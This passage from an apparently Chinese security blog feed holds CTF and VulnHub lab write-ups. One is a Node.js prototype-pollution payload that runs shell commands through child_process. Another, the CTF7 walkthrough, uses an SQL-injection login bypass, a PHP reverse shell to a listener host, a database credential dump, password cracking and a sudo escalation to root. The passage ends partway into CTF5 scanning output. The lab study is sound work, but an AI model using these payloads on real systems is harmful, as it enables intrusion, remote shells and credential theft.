class="string">&quot;ADMIN&quot;</span>) &#123; res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) &#125;</span><br><span class="line">    req.session.user.data = clone(req.body);</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>需要是admin才能clone，login：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.Submit == <span class="string">&quot;register&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (safeKeyword(req.body.userid)) &#123;</span><br><span class="line">            res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        req.session.user = &#123;</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: req.body.userid.toUpperCase(),</span><br><span class="line">            <span class="string">&#x27;passwd&#x27;</span>: req.body.pwd,</span><br><span class="line">            <span class="string">&#x27;isLogin&#x27;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.body.Submit == <span class="string">&quot;login&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.session.user) &#123; res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) &#125;</span><br><span class="line">        <span class="keyword">if</span> (req.session.user.user == req.body.userid &amp;&amp; req.body.pwd == req.session.user.passwd) &#123;</span><br><span class="line">            req.session.user.isLogin = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/&#x27;</span>);;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>匹配大小写之后<code>toUpperCase</code>转为大写，p牛的一篇文章：</p><blockquote><p>  Fuzz中的javascript大小写特性</p><p>  <a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p></blockquote><p>注册admın</p><p>之后就到了漏洞部分：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.session.user.user != <span class="string">&quot;ADMIN&quot;</span>) &#123; res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) &#125;</span><br><span class="line">    req.session.user.data = clone(req.body);</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>payload的构造：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p><p><code>&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /flag&#39;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</code></p><p>改application/json，之后访问info得flag。</p><p>end.</p><hr><blockquote><p>  <a href="https://www.cnblogs.com/ophxc/p/13298896.html">https://www.cnblogs.com/ophxc/p/13298896.html</a><br>  <a href="https://as1def.github.io/2021/01/24/NodeJs%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://as1def.github.io/2021/01/24/NodeJs%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a><br>  <a href="https://www.anquanke.com/post/id/236182">https://www.anquanke.com/post/id/236182</a><br>  <a href="https://www.freebuf.com/articles/web/200406.html">https://www.freebuf.com/articles/web/200406.html</a><br>  <a href="https://www.cnblogs.com/tr1ple/p/11360881.html">https://www.cnblogs.com/tr1ple/p/11360881.html</a><br>  <a href="https://0xcreed.jxustctf.top/2020/06/nodejs%E5%AD%A6%E4%B9%A0/">https://0xcreed.jxustctf.top/2020/06/nodejs%E5%AD%A6%E4%B9%A0/</a><br>  <a href="https://xz.aliyun.com/t/7184#toc-3">https://xz.aliyun.com/t/7184#toc-3</a><br>  <a href="https://xz.aliyun.com/t/7182">https://xz.aliyun.com/t/7182</a><br>  <a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a><br>  <a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a><br>  <a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;NodeJs基础&quot;&gt;&lt;a href=&quot;#NodeJs基础&quot; class=&quot;headerlink&quot; title=&quot;NodeJs基础&quot;&gt;&lt;/a&gt;NodeJs基础&lt;/h1&gt;&lt;p&gt;好像也没啥写的。。&lt;/p&gt;
&lt;h2 id=&quot;child-proce</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub_03_LAMPSECURITY: CTF7</title>
    <link href="http://example.com/2022/02/19/VulnHub03/"/>
    <id>http://example.com/2022/02/19/VulnHub03/</id>
    <published>2022-02-18T16:00:00.000Z</published>
    <updated>2022-02-19T11:26:17.501Z</updated>
    
    <content type="html"><![CDATA[<p>download：<code>https://www.vulnhub.com/entry/lampsecurity-ctf7,86/</code></p><p>找到ip为：<code>192.168.188.132</code></p><blockquote><p>  nmap参数：</p><p>  -Pn ：不检测主机存活</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># nmap -Pn -sV 192.168.188.132                                                                               130 ⨯</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 03:56 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.188.132</span><br><span class="line">Host is up (0.00064s latency).</span><br><span class="line">Not shown: 993 filtered ports</span><br><span class="line">PORT      STATE  SERVICE     VERSION</span><br><span class="line">22/tcp    open   ssh         OpenSSH 5.3 (protocol 2.0)</span><br><span class="line">80/tcp    open   http        Apache httpd 2.2.15 ((CentOS))</span><br><span class="line">139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">901/tcp   open   http        Samba SWAT administration server</span><br><span class="line">5900/tcp  closed vnc</span><br><span class="line">8080/tcp  open   http        Apache httpd 2.2.15 ((CentOS))</span><br><span class="line">10000/tcp open   http        MiniServ 1.610 (Webmin httpd)</span><br><span class="line">MAC Address: 00:0C:29:9D:12:A9 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 46.98 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>8080有个web服务，登录框：<code>&#39; or 1=1 -- .</code>，直接注入进去</p><p>在reading上传shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.188.129/4444 0&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><img src="/2022/02/19/VulnHub03/image-20220219171650551.png" alt="image-20220219171650551"></p><p>但是不知道上传的位置，扫一下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># dirb http://192.168.188.132                                                                                255 ⨯</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Feb 19 04:17:38 2022</span><br><span class="line">URL_BASE: http://192.168.188.132/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.188.132/ ----</span><br><span class="line">+ http://192.168.188.132/about (CODE:200|SIZE:4910)                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.188.132/assets/                                                                       </span><br><span class="line">+ http://192.168.188.132/backups (CODE:301|SIZE:335)                                                                </span><br><span class="line">+ http://192.168.188.132/cgi-bin/ (CODE:403|SIZE:291)                                                               </span><br><span class="line">+ http://192.168.188.132/contact (CODE:200|SIZE:5017)                                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.188.132/css/                                                                          </span><br><span class="line">+ http://192.168.188.132/db (CODE:200|SIZE:3904)                                                                    </span><br><span class="line">+ http://192.168.188.132/default (CODE:200|SIZE:6058)                                                               </span><br><span class="line">+ http://192.168.188.132/footer (CODE:200|SIZE:3904)                                                                </span><br><span class="line">+ http://192.168.188.132/header (CODE:200|SIZE:3904)                                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.188.132/img/                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.188.132/inc/                                                                          </span><br><span class="line">+ http://192.168.188.132/index.php (CODE:200|SIZE:6058)                                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.188.132/js/                                                                           </span><br><span class="line">+ http://192.168.188.132/newsletter (CODE:200|SIZE:4037)                                                            </span><br><span class="line">+ http://192.168.188.132/phpinfo (CODE:200|SIZE:58773)                                                              </span><br><span class="line">+ http://192.168.188.132/profile (CODE:200|SIZE:3977)              </span><br></pre></td></tr></table></figure><p>注意到：<a href="http://192.168.188.132/assets/">http://192.168.188.132/assets/</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc -lp 4444</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-4.1$ ls</span><br><span class="line">ls</span><br><span class="line">0223_cybersecurity_china_us_lieberthal_singer_pdf_english.pdf</span><br><span class="line">1.php</span><br><span class="line">88x31.png</span><br><span class="line">apple-touch-icon-114-precomposed.png</span><br><span class="line">apple-touch-icon-144-precomposed.png</span><br><span class="line">apple-touch-icon-57-precomposed.png</span><br><span class="line">apple-touch-icon-72-precomposed.png</span><br><span class="line">higher-eduction-national-security.pdf</span><br><span class="line">re.php</span><br><span class="line">reverse_php_shell.php</span><br><span class="line">bash-4.1$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">bash-4.1$ mysql -u root</span><br><span class="line">mysql -u root</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 242</span><br><span class="line">Server version: 5.1.66 Source distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| roundcube          |</span><br><span class="line">| website            |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use website;</span><br><span class="line">use website;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-------------------+</span><br><span class="line">| Tables_in_website |</span><br><span class="line">+-------------------+</span><br><span class="line">| contact           |</span><br><span class="line">| documents         |</span><br><span class="line">| hits              |</span><br><span class="line">| <span class="built_in">log</span>               |</span><br><span class="line">| newsletter        |</span><br><span class="line">| payment           |</span><br><span class="line">| trainings         |</span><br><span class="line">| trainings_x_users |</span><br><span class="line">| users             |</span><br><span class="line">+-------------------+</span><br><span class="line">9 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users</span><br><span class="line">select * from users</span><br><span class="line">    -&gt; ;</span><br><span class="line">;</span><br><span class="line">+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+</span><br><span class="line">| username                      | password                         | is_admin | last_login          | user_id | realname        | profile                                                                  |</span><br><span class="line">+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+</span><br><span class="line">| brian@localhost.localdomain   | e22f07b17f98e0d9d364584ced0e3c18 |        1 | 2012-12-19 11:30:54 |       3 | Brian Hershel   | Brian is our technical brains behind the operations and a chief trainer. |</span><br><span class="line">| john@localhost.localdomain    | 0d9ff2a4396d6939f80ffe09b1280ee1 |        1 | NULL                |       4 | John Durham     |                                                                          |</span><br><span class="line">| alice@localhost.localdomain   | 2146bf95e8929874fc63d54f50f1d2e3 |        1 | NULL                |       5 | Alice Wonder    |                                                                          |</span><br><span class="line">| ruby@localhost.localdomain    | 9f80ec37f8313728ef3e2f218c79aa23 |        1 | NULL                |       6 | Ruby Spinster   |                                                                          |</span><br><span class="line">| leon@localhost.localdomain    | 5d93ceb70e2bf5daa84ec3d0cd2c731a |        1 | NULL                |       7 | Leon Parnetta   |                                                                          |</span><br><span class="line">| julia@localhost.localdomain   | ed2539fe892d2c52c42a440354e8e3d5 |        1 | NULL                |       8 | Julia Fields    |                                                                          |</span><br><span class="line">| michael@localhost.localdomain | 9c42a1346e333a770904b2a2b37fa7d3 |        0 | NULL                |       9 | Michael Saint   |                                                                          |</span><br><span class="line">| bruce@localhost.localdomain   | 3a24d81c2b9d0d9aaf2f10c6c9757d4e |        0 | NULL                |      10 | Bruce Pottricks |                                                                          |</span><br><span class="line">| neil@localhost.localdomain    | 4773408d5358875b3764db552a29ca61 |        0 | NULL                |      11 | Neil Felstein   |                                                                          |</span><br><span class="line">| charles@localhost.localdomain | b2a97bcecbd9336b98d59d9324dae5cf |        0 | NULL                |      12 | Charles Adams   |                                                                          |</span><br><span class="line">| foo@bar.com                   | 4cb9c8a8048fd02294477fcb1a41191a |        0 | NULL                |      36 |                 |                                                                          |</span><br><span class="line">| <span class="built_in">test</span>@nowhere.com              | 098f6bcd4621d373cade4e832627b4f6 |        0 | NULL                |     113 |                 |                                                                          |</span><br><span class="line">+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用一些脚本破解hash，或者在线的网站</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bash-4.1$ su brian</span><br><span class="line">su brian</span><br><span class="line">Password: my2cents</span><br><span class="line"></span><br><span class="line">[brian@localhost assets]$ id</span><br><span class="line">id</span><br><span class="line">uid=501(brian) gid=501(brian) groups=501(brian),10(wheel),500(webdev),512(admin) context=system_u:system_r:httpd_t:s0</span><br><span class="line">[brian@localhost assets]$ sudo su</span><br><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the <span class="built_in">local</span> System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> brian: my2cents</span><br><span class="line"></span><br><span class="line">[root@localhost assets]<span class="comment"># </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;download：&lt;code&gt;https://www.vulnhub.com/entry/lampsecurity-ctf7,86/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;找到ip为：&lt;code&gt;192.168.188.132&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; </summary>
      
    
    
    
    
    <category term="VulnHub" scheme="http://example.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub_02_LAMPSECURITY: CTF5</title>
    <link href="http://example.com/2022/02/17/VulnHub02/"/>
    <id>http://example.com/2022/02/17/VulnHub02/</id>
    <published>2022-02-16T16:00:00.000Z</published>
    <updated>2022-02-19T08:33:38.936Z</updated>
    
    <content type="html"><![CDATA[<p>download:<a href="https://www.vulnhub.com/entry/lampsecurity-ctf5,84/">https://www.vulnhub.com/entry/lampsecurity-ctf5,84/</a></p><p>扫描之后发现是：<code>http://192.168.188.131</code></p><p><code>nmap -sV &lt; 要扫描的目标ip地址&gt;</code>*</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># nmap -sV 192.168.188.131                                                                                   130 ⨯</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-16 01:26 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.188.131</span><br><span class="line">Host is up (0.0059s latency).</span><br><span class="line">Not shown: 990 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)</span><br><span class="line">25/tcp   open  smtp        Sendmail 8.14.1/8.14.1</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))</span><br><span class="line">110/tcp  open  pop3        ipop3d 2006k.101</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">143/tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0500)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">901/tcp  open  http        Samba SWAT administration server</span><br><span class="line">3306/tcp open  mysql       MySQL 5.0.45</span><br><span class="line">MAC Address: 00:0C:29:44:6B:32 (VMware)</span><br><span class="line">Service Info: Hosts: localhost.localdomain, 192.168.188.131; OS: Unix</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.79 seconds</span><br><span class="line">                                                                 </span><br></pre></td></tr></table></figure><p>使用nikto扫下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="comment"># nikto -h 192.168.188.131</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.188.131</span><br><span class="line">+ Target Hostname:    192.168.188.131</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2022-02-16 01:29:54 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.6 (Fedora)</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.2.4</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ Apache/2.2.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL <span class="keyword">for</span> the 2.x branch.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE </span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ /index.php: PHP include error may indicate <span class="built_in">local</span> or remote file inclusion is possible.</span><br><span class="line">^[[B^[[B^[[B+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is <span class="keyword">for</span> managing MySQL databases, and should be protected or limited to authorized hosts.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /phpmyadmin/ChangeLog, inode: 558008, size: 22676, mtime: Mon Aug 20 22:59:12 2029</span><br><span class="line">+ OSVDB-3092: /phpmyadmin/ChangeLog: 